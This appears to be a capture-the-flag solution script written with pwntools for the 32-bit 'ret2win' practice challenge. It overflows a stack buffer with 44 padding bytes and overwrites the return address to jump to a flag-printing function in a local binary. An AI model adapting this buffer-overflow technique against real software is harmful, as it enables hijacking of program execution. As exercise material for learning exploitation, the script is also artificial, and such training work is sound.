from pwn import *
target=process('./ret2win32')

#intial payload
payload="A"*44

#return address to print flag
ret2win=0x8048659

#final payload
payload+=p32(ret2win)
payload+="\x00"*2

#send payload
target.sendline(payload)

target.interactive()
